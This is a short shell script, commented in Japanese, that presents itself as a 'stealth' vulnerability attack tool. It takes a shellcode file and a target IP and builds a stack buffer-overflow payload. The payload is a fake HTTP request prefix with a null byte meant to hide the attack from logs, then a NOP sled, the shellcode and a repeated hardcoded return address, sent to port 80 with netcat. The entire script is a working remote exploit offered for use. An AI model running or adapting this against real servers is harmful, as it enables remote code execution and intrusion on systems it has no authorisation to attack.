#!/bin/sh 
# ステルス型脆弱性攻撃ツール
if [ -z "$2" ]; then  # 引数が足りない場合
   echo "使用方法： $0 ＜シェルコードを格納したファイル＞ ＜攻撃対象IPアドレス＞"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # バッファの開始位置（0xbffff5c0）+100バイト
echo "攻撃対象IPアドレス： $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "シェルコード： $1 ($SIZE バイト)"
echo "ニセのリクエスト： \"$FAKEREQUEST\" ($FR_SIZE バイト)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE))

echo "[ニセのリクエスト ($FR_SIZE バイト)] [NOPスレッド ($ALIGNED_SLED_SIZE バイト)] [シェルコード ($SIZE バイト)] [戻りアドレス ($((4*32)) バイト)]"
(perl -e "print \"$FAKEREQUEST\" . \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
 perl -e "print \"$RETADDR\"x32 . \"\r\n\"") | nc -w 1 -v $2 80 
